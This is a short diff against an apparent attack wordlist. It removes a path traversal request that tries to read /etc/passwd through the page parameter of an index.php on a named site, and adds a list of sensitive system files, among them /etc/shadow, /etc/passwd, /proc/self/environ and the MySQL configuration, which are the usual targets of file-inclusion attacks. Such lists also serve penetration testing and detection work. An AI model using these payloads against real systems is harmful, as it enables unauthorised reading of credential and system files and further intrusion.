@@ -1,1 +1,11 @@
-https://magicsquash.fr/pages/index.php?page=/../../../../../etc/passwd
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*
+/proc/self/environ
+/proc/version
+/proc/cmdline
